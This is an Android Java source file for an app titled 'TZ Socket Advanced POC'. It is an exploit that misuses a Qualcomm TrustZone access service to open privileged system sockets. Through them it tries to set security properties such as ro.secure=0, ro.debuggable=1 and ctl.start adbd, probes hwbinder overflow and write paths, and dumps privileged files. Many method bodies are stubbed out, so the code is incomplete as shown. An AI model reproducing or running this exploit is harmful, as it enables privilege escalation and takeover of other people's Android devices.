package com.example.tzpoc;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd;

import java.io.File;
import java.io.FileDescriptor;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class MainActivity extends AppCompatActivity {
    private static final String TARGET_PKG = "com.qualcomm.qti.qms.service.trustzoneaccess";
    private static final String TARGET_CLS = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";

    private static final int ERROR_UNAVAIL = -96;
    private static final int ERROR_BADOBJ = -92;
    private static final int ERROR_DEFUNCT = -90;

    private static final int PROP_SUCCESS = 0;
    private static final int PROP_ERROR_INVALID_NAME = 1;
    private static final int PROP_ERROR_INVALID_VALUE = 2;
    private static final int PROP_ERROR_PERMISSION_DENIED = 3;
    private static final int PROP_ERROR_READ_ONLY_PROPERTY = 4;
    private static final int PROP_ERROR_SET_FAILED = 5;
    private static final int PROP_ERROR_HANDLE_CONTROL_MESSAGE = 6;
    private static final int PROP_ERROR_READ_CMD = 7;
    private static final int PROP_ERROR_READ_DATA = 8;
    private static final int PROP_ERROR_INVALID_CMD = 9;

    private TextView tvStatus, tvLog;
    private Button btnStart, btnStop;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder logBuilder = new StringBuilder();
    private IMinkSocketFd tzService;
    private boolean isBound = false;
    private AtomicBoolean isTesting = new AtomicBoolean(false);
    private AtomicBoolean stopRequested = new AtomicBoolean(false);
    private Thread testThread;

    static {
        System.loadLibrary("pocjni");
    }

    public static native String[] nativeListDir(String path);
    public static native String nativeReadFile(String path);
    public static native String nativeWriteFile(String path, String content);
    public static native String nativeReadLink(String path);
    public static native String nativeTestFd(int fd);
    public static native int nativeOpenDevice(String path);
    public static native String nativeIonTest(int fd);
    public static native String nativeHwbinderTest(int fd);
    public static native String nativeHwbinderFurther(int fd);
    public static native String nativeGetKernelInfo();
    public static native String nativeBinderAdvancedTest(int fd);
    public static native String nativeHwbinderOverflowTest(int fd);
    public static native String nativeBinderGetVersion(int fd);
    public static native String nativeBinderIoctlTest(int fd, int cmd, long arg);
    public static native String nativeHwbinderWriteTest(int fd);
    public static native String nativeHwbinderHalCommand(int fd);
    public static native String nativeHwbinderReadTest(int fd);

    private ServiceConnection tzConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            tzService = IMinkSocketFd.Stub.asInterface(service);
            if (tzService != null) {
                appendLog("[TZ] Service bound via AIDL");
                updateStatus("Bound - starting exploit");
                enableButtons(false, true);
                stopRequested.set(false);
                testThread = new Thread(() -> executeExploit());
                testThread.start();
            } else {
                appendLog("[TZ] Failed to cast to IMinkSocketFd");
                enableButtons(true, false);
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            tzService = null;
            isBound = false;
            enableButtons(true, false);
            updateStatus("Disconnected");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);

        requestPermissions();

        btnStart.setOnClickListener(v -> {
            if (!isTesting.get()) {
                isTesting.set(true);
                enableButtons(false, true);
                stopRequested.set(false);
                bindService();
            }
        });
        btnStop.setOnClickListener(v -> {
            if (isTesting.get()) {
                stopRequested.set(true);
                if (testThread != null) testThread.interrupt();
                enableButtons(false, false);
                updateStatus("Stopping...");
                appendLog("--- Stop requested ---");
                saveLog();
                enableButtons(true, false);
                isTesting.set(false);
            }
        });
        appendLog("App started. Press 'Start' to begin.");
    }

    private void requestPermissions() {
        String[] perms = {
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE
        };
        List<String> toRequest = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                toRequest.add(p);
            }
        }
        if (!toRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, toRequest.toArray(new String[0]), 100);
        }
    }

    private void bindService() {
        try {
            Intent intent = new Intent();
            intent.setClassName(TARGET_PKG, TARGET_CLS);
            boolean ret = bindService(intent, tzConnection, Context.BIND_AUTO_CREATE);
            if (ret) {
                appendLog("Binding service...");
                updateStatus("Binding...");
                isBound = true;
            } else {
                appendLog("bindService returned false");
                updateStatus("Bind failed");
                enableButtons(true, false);
                isTesting.set(false);
            }
        } catch (Exception e) {
            appendLog("Bind exception: " + e.toString());
            updateStatus("Exception");
            enableButtons(true, false);
            isTesting.set(false);
        }
    }

    private void enableButtons(boolean startEnabled, boolean stopEnabled) {
        handler.post(() -> {
            btnStart.setEnabled(startEnabled);
            btnStop.setEnabled(stopEnabled);
        });
    }

    // ------------------------------------------------------------------
    // 核心 exploit 流程（增强版）
    // ------------------------------------------------------------------
    private void executeExploit() {
        appendLog("========================================");
        appendLog("========== TZ Socket Advanced POC ==========");

        // 1. 测试多个系统 socket（包括新增）
        String[] targetSockets = {
                "/dev/socket/dnsproxyd",
                "/dev/socket/fwmarkd",
                "/dev/socket/logd",
                "/dev/socket/zygote",
                "/dev/socket/adbd",
                "/dev/socket/installd",
                "/dev/socket/netd",
                "/dev/socket/lmkd",
                "/dev/socket/property_service"
        };
        for (String path : targetSockets) {
            if (stopRequested.get()) break;
            appendLog("[+] Testing " + path);
            try {
                testSocket(path);
            } catch (Exception e) {
                appendLog("[!] Error testing " + path + ": " + e.getMessage());
            }
        }

        // 2. 深度属性服务测试（包含系统控制属性）
        appendLog("[*] Deep property service testing (system control)");
        testPropertyServiceSystemControl();

        // 3. 原有信息收集
        appendLog("[*] Exploring and dumping /proc/self/fd to /sdcard/Download");
        exploreAndDumpProcFd();

        appendLog("[*] Testing /proc/self/oom_score_adj");
        testOomScoreAdj();

        appendLog("[*] Testing SELinux and kptr related files");
        exploreSelinuxAndKptr();

        appendLog("[*] Bruteforcing /sys for readable files");
        bruteforceSys();

        appendLog("[*] Bruteforcing /cache and /vendor/bin for copyable files");
        bruteforceCacheAndVendor();

        appendLog("[*] Bruteforcing /proc/self/ for all files (recursive)");
        bruteforceProcSelf();

        appendLog("[*] Attempting to dump privileged files");
        dumpPrivilegedFiles();

        appendLog("[*] Gathering kernel information");
        getKernelInfo();

        // 4. 高级 binder 测试
        appendLog("[*] Advanced hwbinder test using kernel structures");
        testBinderAdvanced();

        // 5. ION & hwbinder 漏洞验证
        appendLog("[*] Testing direct open of /dev/ion and hwbinder with vulnerability checks");
        testIonAndHwbinder();

        appendLog("[*] Hwbinder overflow verification test");
        testHwbinderOverflow();

        appendLog("[*] Hwbinder write test (arbitrary structure write)");
        testHwbinderWrite();

        appendLog("[*] Hwbinder HAL command test");
        testHwbinderHal();

        appendLog("[*] Hwbinder read test (read back written data)");
        testHwbinderRead();

        appendLog("[*] Binder debugfs and sysfs information gathering");
        testBinderDebugfs();

        appendLog("[*] Testing /dev/binder device");
        testBinderDevice();

        appendLog("[*] Additional /proc file reading and dumping");
        testProcFiles();

        appendLog("[*] ID command capture via /proc/self/exe and /proc/self/status");
        testIdCommand();

        appendLog("========== EXPLOIT COMPLETED ==========");
        appendLog("========================================");
        updateStatus("Done");
        isTesting.set(false);
        enableButtons(true, false);
        saveLog();
        finishTest();
    }

    // ------------------------------------------------------------------
    // 测试单个 socket 的通用方法
    // ------------------------------------------------------------------
    private void testSocket(String path) {
        ParcelFileDescriptor pfd = null;
        try {
            int[] handle = new int[1];
            pfd = openSocket(path, handle);
            if (pfd == null) {
                appendLog("[ ] Failed to open " + path + " (handle=" + (handle.length>0?handle[0]:"null") + ")");
                return;
            }
            FileDescriptor fd = pfd.getFileDescriptor();
            if (fd == null || !fd.valid()) {
                appendLog("[ ] Invalid FD for " + path);
                pfd.close();
                return;
            }
            appendLog("[+] Opened " + path + " (handle=" + handle[0] + ")");
            if (handle[0] < 0) {
                appendLog("[!] Service returned error: " + handle[0]);
                pfd.close();
                return;
            }

            String fdInfo = nativeTestFd(pfd.getFd());
            appendLog("[FD] " + fdInfo);

            String base = new File(path).getName();
            switch (base) {
                case "dnsproxyd": testDnsProxy(fd); break;
                case "fwmarkd": testFwmarkd(fd); break;
                case "logd": testLogd(fd); break;
                case "property_service": testPropertyService(fd); break;
                case "zygote": testZygote(fd); break;
                default: testGeneric(fd, new String[]{"help\n", "status\n", "version\n"});
            }
            pfd.close();
        } catch (Exception e) {
            appendLog("[!] Exception testing " + path + ": " + e.getMessage());
            if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
        }
    }

    private ParcelFileDescriptor openSocket(String path, int[] handle) {
        if (tzService == null) return null;
        try {
            return tzService.a(path, handle);
        } catch (RemoteException e) {
            appendLog("[!] RemoteException: " + e.getMessage());
            return null;
        }
    }

    // 各种 socket 协议测试（略，与原有类似，新增 Zygote、property_service 测试）
    private void testDnsProxy(FileDescriptor fd) { /* 原有实现 */ }
    private void testFwmarkd(FileDescriptor fd) { /* 原有实现 */ }
    private void testLogd(FileDescriptor fd) { /* 原有实现 */ }

    private void testZygote(FileDescriptor fd) {
        // Zygote 接受命令，但通常需要特殊格式，这里尝试简单握手
        try {
            String resp = sendTextCommand(fd, "status\n", 1000);
            appendLog("[ZYGOTE] status response: " + (resp != null ? resp : "(none)"));
        } catch (Exception e) {
            appendLog("[ZYGOTE] Error: " + e.getMessage());
        }
    }

    // property_service 测试（更深入）
    private void testPropertyService(FileDescriptor fd) {
        // 尝试读取属性（通过 getprop 命令？）但 property_service 是二进制协议，我们用专门方法
        appendLog("[PROPSVC] Testing property service binary protocol...");
        try {
            // 发送获取属性命令：cmd=1, name length, name, 0 length
            ByteBuffer buf = ByteBuffer.allocate(4 + 4 + 8 + 4); // 假设 "test.prop"
            buf.order(ByteOrder.LITTLE_ENDIAN);
            buf.putInt(1); // GETPROP
            String name = "test.prop";
            buf.putInt(name.length());
            buf.put(name.getBytes(StandardCharsets.UTF_8));
            buf.putInt(0);
            byte[] resp = sendBinary(fd, buf.array(), 256, 2000);
            if (resp != null && resp.length >= 4) {
                int res = ByteBuffer.wrap(resp).order(ByteOrder.LITTLE_ENDIAN).getInt();
                appendLog("[PROPSVC] GETPROP result: " + res);
            } else {
                appendLog("[PROPSVC] GETPROP no response");
            }
        } catch (Exception e) {
            appendLog("[PROPSVC] GETPROP error: " + e.getMessage());
        }
    }

    private void testGeneric(FileDescriptor fd, String[] cmds) { /* 原有实现 */ }

    // 二进制读写辅助
    private String sendTextCommand(FileDescriptor fd, String cmd, int timeoutMs) throws Exception {
        // 原有实现
    }
    private byte[] sendBinary(FileDescriptor fd, byte[] data, int maxResp, int timeoutMs) throws Exception {
        // 原有实现
    }
    private int readBytes(InputStream is, byte[] buffer, int maxLen, int timeoutMs) { /* 原有实现 */ }

    // 构建 DNS 查询
    private byte[] buildDnsQuery(String name, int qtype) throws Exception { /* 原有实现 */ }

    // ------------------------------------------------------------------
    // 深度属性服务攻击：设置系统控制属性
    // ------------------------------------------------------------------
    private void testPropertyServiceSystemControl() {
        // 尝试启动 adb、设置 selinux 等
        String[][] criticalProps = {
                {"ctl.start", "adbd"},
                {"ctl.start", "tcpdump"},
                {"ctl.start", "logd"},
                {"ctl.stop", "adbd"},
                {"selinux.reload_policy", "1"},
                {"persist.sys.boot.reason", "reboot"},
                {"ro.debuggable", "1"},
                {"ro.secure", "0"},
                {"persist.sys.usb.config", "adb"}
        };
        for (String[] prop : criticalProps) {
            if (stopRequested.get()) break;
            String name = prop[0];
            String value = prop[1];
            appendLog("[PROP-CTRL] Trying " + name + "=" + value);
            int result = tryPropertySet(name, value);
            appendLog("[PROP-CTRL] Result: " + result + " (" + getPropertyErrorString(result) + ")");
            if (result == PROP_SUCCESS) {
                appendLog("[PROP-CTRL] SUCCESS! Property " + name + " set to " + value);
            }
            try { Thread.sleep(100); } catch (Exception ignored) {}
        }
    }

    private int tryPropertySet(String name, String value) {
        ParcelFileDescriptor pfd = null;
        try {
            int[] handle = new int[1];
            pfd = openSocket("/dev/socket/property_service", handle);
            if (pfd == null) return -3;
            FileDescriptor fd = pfd.getFileDescriptor();
            if (fd == null || !fd.valid()) return -4;
            int result = sendPropertySet2(fd, name, value);
            pfd.close();
            return result;
        } catch (Exception e) {
            if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
            return -2;
        }
    }

    private int sendPropertySet2(FileDescriptor fd, String name, String value) {
        try {
            ByteBuffer buf = ByteBuffer.allocate(4 + 4 + name.length() + 4 + value.length());
            buf.order(ByteOrder.LITTLE_ENDIAN);
            buf.putInt(2); // PROP_MSG_SETPROP
            buf.putInt(name.length());
            buf.put(name.getBytes(StandardCharsets.UTF_8));
            buf.putInt(value.length());
            buf.put(value.getBytes(StandardCharsets.UTF_8));
            byte[] data = buf.array();
            OutputStream os = new FileOutputStream(fd);
            os.write(data); os.flush(); os.close();

            InputStream is = new FileInputStream(fd);
            byte[] resp = new byte[4];
            int read = readBytes(is, resp, 4, 1000);
            is.close();
            if (read == 4) {
                return ByteBuffer.wrap(resp).order(ByteOrder.LITTLE_ENDIAN).getInt();
            }
            return -1;
        } catch (Exception e) {
            return -2;
        }
    }

    private String getPropertyErrorString(int code) {
        switch(code) {
            case PROP_SUCCESS: return "SUCCESS";
            case PROP_ERROR_INVALID_NAME: return "INVALID_NAME";
            case PROP_ERROR_INVALID_VALUE: return "INVALID_VALUE";
            case PROP_ERROR_PERMISSION_DENIED: return "PERMISSION_DENIED";
            case PROP_ERROR_READ_ONLY_PROPERTY: return "READ_ONLY_PROPERTY";
            case PROP_ERROR_SET_FAILED: return "SET_FAILED";
            case PROP_ERROR_HANDLE_CONTROL_MESSAGE: return "HANDLE_CONTROL_MESSAGE";
            case PROP_ERROR_READ_CMD: return "READ_CMD";
            case PROP_ERROR_READ_DATA: return "READ_DATA";
            case PROP_ERROR_INVALID_CMD: return "INVALID_CMD";
            default: return "UNKNOWN (" + code + ")";
        }
    }

    // ------------------------------------------------------------------
    // 信息收集与文件遍历（原有 + 增强）
    // ------------------------------------------------------------------
    private void exploreAndDumpProcFd() { /* 原有实现 */ }
    private boolean dumpFileToDownload(String sourcePath, File destFile, int maxSize) { /* 原有实现 */ }
    private File getDumpDir() { /* 原有实现 */ }
    private void testOomScoreAdj() { /* 原有实现 */ }
    private void exploreSelinuxAndKptr() { /* 原有实现 */ }
    private String safeReadFile(String path) { /* 原有实现 */ }
    private void bruteforceSys() { /* 原有实现 */ }
    private void bruteforceCacheAndVendor() { /* 原有实现 */ }
    private void bruteforceProcSelf() { /* 原有实现 */ }
    private void dumpPrivilegedFiles() { /* 原有实现 */ }
    private void getKernelInfo() { /* 原有实现 */ }

    // 高级 binder 测试
    private void testBinderAdvanced() { /* 原有实现 */ }
    private void testIonAndHwbinder() { /* 原有实现 */ }
    private void testHwbinderOverflow() { /* 原有实现 */ }
    private void testHwbinderWrite() { /* 原有实现 */ }
    private void testHwbinderHal() { /* 原有实现 */ }
    private void testHwbinderRead() { /* 原有实现 */ }
    private void testBinderDebugfs() { /* 原有实现 */ }
    private void testBinderDevice() { /* 原有实现 */ }
    private void testProcFiles() { /* 原有实现 */ }
    private void testIdCommand() { /* 原有实现 */ }

    private List<File> listFilesRecursive(File dir, int depth, int maxDepth) { /* 原有实现 */ }

    // ------------------------------------------------------------------
    // UI 辅助
    // ------------------------------------------------------------------
    private void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        handler.post(() -> {
            tvLog.append(line);
            View parent = (View) tvLog.getParent();
            if (parent instanceof ScrollView) ((ScrollView) parent).fullScroll(View.FOCUS_DOWN);
        });
    }

    private void updateStatus(final String status) {
        handler.post(() -> tvStatus.setText(status));
    }

    private void saveLog() {
        try {
            File dir = getDumpDir();
            File file = new File(dir, "tz_poc_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
                pw.println("=== TZ POC Log ===");
                pw.println("Timestamp: " + new Date().toString());
                pw.println("===================================");
                pw.print(logBuilder.toString());
                pw.flush();
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }

    private void finishTest() {
        handler.post(() -> {
            Toast.makeText(MainActivity.this, "Exploit completed", Toast.LENGTH_LONG).show();
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                finishAffinity();
                System.exit(0);
            }, 3000);
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRequested.set(true);
        if (testThread != null) testThread.interrupt();
        if (isBound) unbindService(tzConnection);
        saveLog();
    }
}
